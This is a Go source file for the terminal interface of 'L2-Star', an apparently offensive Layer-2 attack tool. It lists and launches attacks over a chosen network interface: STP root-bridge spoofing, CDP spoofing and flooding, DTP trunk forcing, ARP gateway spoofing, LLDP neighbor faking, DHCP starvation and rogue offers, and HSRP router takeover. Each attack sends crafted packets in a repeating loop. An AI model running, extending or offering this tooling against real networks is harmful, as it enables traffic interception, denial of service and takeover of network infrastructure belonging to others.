package ui

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/gnpaone/l2star/internal/core"
	"github.com/gnpaone/l2star/internal/proto/arp"
	"github.com/gnpaone/l2star/internal/proto/cdp"
	"github.com/gnpaone/l2star/internal/proto/dhcp"
	"github.com/gnpaone/l2star/internal/proto/dtp"
	"github.com/gnpaone/l2star/internal/proto/hsrp"
	"github.com/gnpaone/l2star/internal/proto/lldp"
	"github.com/gnpaone/l2star/internal/proto/stp"
	"github.com/gnpaone/l2star/internal/utils"

	l2net "github.com/gnpaone/l2star/internal/net"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

type State int

const (
	StateInterfaceSelect State = iota
	StateMain
)

type AttackStatus struct {
	Active    bool
	Protocol  string
	StopChan  chan struct{}
	StartTime time.Time
}

type Model struct {
	state           State
	interfaces      []core.Interface
	selectedIface   int
	activeInterface string
	senderMAC       net.HardwareAddr
	activeTab      int
	tabs           []string
	selectedAttack int
	logs []string
	attack AttackStatus
	width  int
	height int
}

func InitialModel() Model {
	ifaces, _ := l2net.ListInterfaces()

	m := Model{
		state:      StateInterfaceSelect,
		interfaces: ifaces,
		tabs:       []string{"STP", "CDP", "DTP", "ARP", "LLDP", "DHCP", "HSRP"},
		logs:       []string{"Welcome to L2-Star. Select an interface to begin."},
	}
	return m
}

func (m Model) Init() tea.Cmd {
	return nil
}

func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			if m.attack.Active {
				close(m.attack.StopChan)
			}
			return m, tea.Quit
		}
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
	}

	if m.state == StateInterfaceSelect {
		return m.updateInterfaceSelect(msg)
	} else {
		return m.updateMain(msg)
	}
}

func (m Model) updateInterfaceSelect(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "up", "k":
			if m.selectedIface > 0 {
				m.selectedIface--
			}
		case "down", "j":
			if m.selectedIface < len(m.interfaces)-1 {
				m.selectedIface++
			}
		case "enter":
			if len(m.interfaces) > 0 {
				m.activeInterface = m.interfaces[m.selectedIface].Name
				m.state = StateMain
				m.addLog(fmt.Sprintf("Selected interface: %s", m.activeInterface))

				iface, err := net.InterfaceByName(m.activeInterface)
				if err == nil && len(iface.HardwareAddr) > 0 {
					m.senderMAC = iface.HardwareAddr
				} else {
					m.addLog("Warning: Could not get valid hardware address. Using dummy?")
					m.senderMAC, _ = net.ParseMAC("00:11:22:33:44:55")
				}
			}
		}
	}
	return m, nil
}

func (m Model) updateMain(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "tab", "right", "l":
			m.activeTab = (m.activeTab + 1) % len(m.tabs)
			m.selectedAttack = 0
			if m.attack.Active {
				m.stopAttack() // Safety: stop attack when switching tabs? Or allow background?
			}
		case "shift+tab", "left", "h":
			m.activeTab = (m.activeTab - 1 + len(m.tabs)) % len(m.tabs)
			m.selectedAttack = 0
			if m.attack.Active {
				m.stopAttack()
			}
		case "esc":
			if m.attack.Active {
				m.stopAttack()
			}
			m.state = StateInterfaceSelect
			m.addLog("Returned to Interface Selection.")
		case "down", "j":
			max := 0
			if m.tabs[m.activeTab] == "STP" {
				max = 1 // 2 attacks
			} else if m.tabs[m.activeTab] == "CDP" {
				max = 1 // 2 attacks
			} else if m.tabs[m.activeTab] == "DTP" {
				max = 2 // 3 attacks
			} else if m.tabs[m.activeTab] == "ARP" {
				max = 1 // 2 attacks
			} else if m.tabs[m.activeTab] == "LLDP" {
				max = 0 // 1 attack
			} else if m.tabs[m.activeTab] == "DHCP" {
				max = 1 // 2 attacks
			} else if m.tabs[m.activeTab] == "HSRP" {
				max = 0 // 1 attack
			}
			if m.selectedAttack < max {
				m.selectedAttack++
			}
		case "up", "k":
			if m.selectedAttack > 0 {
				m.selectedAttack--
			}
		case " ":
			if m.attack.Active {
				m.stopAttack()
			} else {
				m.startAttack()
			}
		}
	}
	return m, nil
}

func (m *Model) startAttack() {
	if m.attack.Active {
		return
	}

	protocol := m.tabs[m.activeTab]
	m.addLog(fmt.Sprintf("Starting %s attack on %s...", protocol, m.activeInterface))

	stopChan := make(chan struct{})
	m.attack = AttackStatus{
		Active:    true,
		Protocol:  protocol,
		StopChan:  stopChan,
		StartTime: time.Now(),
	}

	go func() {
		var packet []byte
		var err error
		var cfg core.AttackConfig

		switch protocol {
		case "STP":
			if m.selectedAttack == 0 {
				packet, err = stp.CraftRootClaimBPDU(m.senderMAC)
			} else {
				packet, err = stp.CraftTCNBPDU(m.senderMAC)
			}

			cfg = core.AttackConfig{
				InterfaceName: m.activeInterface,
				StaticPacket:  packet,
				Frequency:     2 * time.Second,
				StopChan:      stopChan,
			}
		case "CDP":
			if m.selectedAttack == 1 {
				generator := func() ([]byte, error) {
					return cdp.CraftCDPDoS(m.senderMAC)
				}
				cfg = core.AttackConfig{
					InterfaceName: m.activeInterface,
					Generator:     generator,
					Frequency:     100 * time.Millisecond,
					StopChan:      stopChan,
				}
			} else {
				packet, err = cdp.CraftCDPNeighborAnnouncement(
					m.senderMAC,
					"Core-Switch-01",
					"GigabitEthernet0/1",
					"Cisco c3750",
					"Cisco IOS Software, C3750 Software (C3750-IPSERVICESK9-M), Version 12.2(55)SE1",
					0x00000028,
					1,
				)
				cfg = core.AttackConfig{
					InterfaceName: m.activeInterface,
					StaticPacket:  packet,
					Frequency:     2 * time.Second,
					StopChan:      stopChan,
				}
			}

		case "DTP":
			switch m.selectedAttack {
			case 0:
				packet, err = dtp.CraftDTPDesirablePacket(m.senderMAC)
			case 1:
				packet, err = dtp.CraftDTPAutoPacket(m.senderMAC)
			case 2:
				packet, err = dtp.CraftDTPTrunkPacket(m.senderMAC)
			}
			cfg = core.AttackConfig{
				InterfaceName: m.activeInterface,
				StaticPacket:  packet,
				Frequency:     1 * time.Second,
				StopChan:      stopChan,
			}
		case "ARP":
			if m.selectedAttack == 0 {
				packet, err = arp.CraftARPReply(m.senderMAC, net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, net.ParseIP("192.168.1.1"), net.ParseIP("192.168.1.255"))
			} else {
				packet, err = arp.CraftARPRequest(m.senderMAC, net.ParseIP("192.168.1.100"), net.ParseIP("192.168.1.1"))
			}
			cfg = core.AttackConfig{
				InterfaceName: m.activeInterface,
				StaticPacket:  packet,
				Frequency:     1 * time.Second,
				StopChan:      stopChan,
			}
		case "LLDP":
			serverName := fmt.Sprintf("L2-Star-Attacker-%d", time.Now().Unix()%1000)
			packet, err = lldp.CraftLLDPNeighbor(m.senderMAC, serverName, "Eth0/1", "L2-Star System")
			cfg = core.AttackConfig{
				InterfaceName: m.activeInterface,
				StaticPacket:  packet,
				Frequency:     30 * time.Second,
				StopChan:      stopChan,
			}
		case "DHCP":
			if m.selectedAttack == 0 {
				generator := func() ([]byte, error) {
					randomMAC, _ := utils.RandomMAC()
					return dhcp.CraftDHCPDiscover(randomMAC)
				}
				cfg = core.AttackConfig{
					InterfaceName: m.activeInterface,
					Generator:     generator,
					Frequency:     200 * time.Millisecond,
					StopChan:      stopChan,
				}
			} else {
				packet, err = dhcp.CraftDHCPOffer(m.senderMAC, net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, net.ParseIP("192.168.1.1"), net.ParseIP("192.168.1.66"), net.ParseIP("192.168.1.1"), 0)
				cfg = core.AttackConfig{
					InterfaceName: m.activeInterface,
					StaticPacket:  packet,
					Frequency:     1 * time.Second,
					StopChan:      stopChan,
				}
			}
		case "HSRP":
			packet, err = hsrp.CraftHSRPState(m.senderMAC, net.ParseIP("192.168.1.1"), 255, 16, 1)
			cfg = core.AttackConfig{
				InterfaceName: m.activeInterface,
				StaticPacket:  packet,
				Frequency:     3 * time.Second,
				StopChan:      stopChan,
			}
		}

		if cfg.Generator == nil && err != nil {
			m.addLog(fmt.Sprintf("Error creating packet: %v", err))
			return
		}

		if err := l2net.StartAttack(cfg); err != nil {
			// TODO: Log error via some mechanism?
		}
	}()
}

func (m *Model) stopAttack() {
	if !m.attack.Active {
		return
	}
	close(m.attack.StopChan)
	m.attack.Active = false
	m.addLog(fmt.Sprintf("Stopped %s attack.", m.attack.Protocol))
}

func (m *Model) addLog(text string) {
	ts := time.Now().Format("15:04:05")
	m.logs = append(m.logs, fmt.Sprintf("[%s] %s", ts, text))
	if len(m.logs) > 50 {
		m.logs = m.logs[1:]
	}
}

func (m Model) View() string {
	if m.state == StateInterfaceSelect {
		return m.viewInterfaceSelect()
	}
	return m.viewMain()
}

func (m Model) viewInterfaceSelect() string {
	s := TitleStyle.Render("L2-Star: Interface Selection") + "\n\n"

	if len(m.interfaces) == 0 {
		s += "No interfaces found. (Are you running as root?)"
		return s
	}

	for i, iface := range m.interfaces {
		cursor := " "
		if m.selectedIface == i {
			cursor = ">"
		}

		line := fmt.Sprintf("%s %s (%s)", cursor, iface.Name, strings.Join(iface.IPs, ", "))
		if m.selectedIface == i {
			line = lipgloss.NewStyle().Foreground(ColorPrimary).Render(line)
		}
		s += line + "\n"
	}

	s += "\nUse arrow keys to select, Enter to confirm."
	return s
}

func (m Model) viewMain() string {
	header := TitleStyle.Render("L2-Star")

	var tabs []string
	for i, t := range m.tabs {
		if i == m.activeTab {
			tabs = append(tabs, ActiveTabStyle.Render(t))
		} else {
			tabs = append(tabs, TabStyle.Render(t))
		}
	}
	tabRow := lipgloss.JoinHorizontal(lipgloss.Top, tabs...)

	var topBar string
	tabsWidth := lipgloss.Width(tabRow)
	headerWidth := lipgloss.Width(header)
	availableWidth := m.width
	isSmallHeight := m.height < 14

	if isSmallHeight {
		header = "L2-Star"
		headerWidth = lipgloss.Width(header)
	}

	minWidth := tabsWidth + headerWidth + 1

	if availableWidth >= minWidth {
		gapWidth := availableWidth - tabsWidth - headerWidth
		gap := lipgloss.NewStyle().Width(gapWidth).Render("")
		topBar = lipgloss.JoinHorizontal(lipgloss.Top, tabRow, gap, header)
	} else {
		topBar = lipgloss.JoinVertical(lipgloss.Left, header, tabRow)
	}

	content := ""
	switch m.tabs[m.activeTab] {
	case "STP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"Root Claim (Spoof Root Bridge)",
			"TCN Injection (Topology Change)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}

	case "CDP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"Neighbor Spoofing (Core Switch)",
			"DoS Flooding (Random Neighbors)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}

	case "DTP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"Trunk Negotiation (Dynamic Desirable)",
			"Trunk Negotiation (Dynamic Auto)",
			"Force Trunk (Trunk / On)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}

	case "ARP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"ARP Reply (Spoof Gateway to Broadcast)",
			"ARP Request (Scanning/Flooding)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}

	case "LLDP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"Neighbor Spoofing (Fake Switch)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}

	case "DHCP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"Starvation (Randomized Discovers)",
			"Rogue Offer (Static Offer 192.168.1.66)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}

	case "HSRP":
		content = "Available Attacks:\n\n"
		attacks := []string{
			"Active Router Takeover (Priority 255)",
		}
		for i, atk := range attacks {
			cursor := " "
			style := lipgloss.NewStyle().Foreground(ColorSubText)
			if m.selectedAttack == i {
				cursor = ">"
				style = lipgloss.NewStyle().Foreground(ColorText).Bold(true)
			}
			content += fmt.Sprintf("%s %s\n", cursor, style.Render(atk))
		}
	}

	status := ""
	if m.attack.Active {
		status = DangerButtonStyle.Render("STOP ATTACK (Space)") + " " +
			lipgloss.NewStyle().Foreground(ColorSuccess).Bold(true).Render("ACTIVE!")
	} else {
		status = ButtonStyle.Render("START ATTACK (Space)")
	}

	topBarView := topBar
	contentView := lipgloss.NewStyle().Padding(0, 2).Render(content)
	statusView := lipgloss.NewStyle().Padding(0, 2).Render(status)

	topBarHeight := lipgloss.Height(topBarView)
	contentHeight := lipgloss.Height(contentView)
	statusHeight := lipgloss.Height(statusView)

	gap1 := "\n\n"
	gap2 := "\n"

	neededFull := topBarHeight + 2 + contentHeight + 1 + statusHeight

	if m.height < neededFull {
		gap1 = "\n"
		neededCompact := topBarHeight + 1 + contentHeight + 1 + statusHeight

		if m.height < neededCompact {
			gap2 = ""
			neededTight := topBarHeight + 1 + contentHeight + statusHeight
			if m.height < neededTight {
				gap1 = ""
			}
		}
	}

	usedHeight := topBarHeight + lipgloss.Height(gap1) + contentHeight + lipgloss.Height(gap2) + statusHeight
	logBoxHeight := m.height - usedHeight - 1

	var logBox string
	if logBoxHeight >= 3 {
		if logBoxHeight > 15 {
			logBoxHeight = 15
		}

		maxContentLines := logBoxHeight - 2
		if maxContentLines < 0 {
			maxContentLines = 0
		}

		start := len(m.logs) - maxContentLines
		if start < 0 {
			start = 0
		}
		visibleLogs := m.logs[start:]

		logView := strings.Join(visibleLogs, "\n")

		logBoxWidth := m.width - 2 
		if logBoxWidth < 20 {
			logBoxWidth = 20
		}

		logBox = LogBoxStyle.Copy().
			Width(logBoxWidth).
			Height(logBoxHeight).
			Render(logView)
	}

	s := topBarView + gap1 + contentView + gap2 + statusView
	if logBox != "" {
		s += "\n\n" + logBox
	}
	
	return lipgloss.Place(m.width, m.height, lipgloss.Left, lipgloss.Top, s)
}
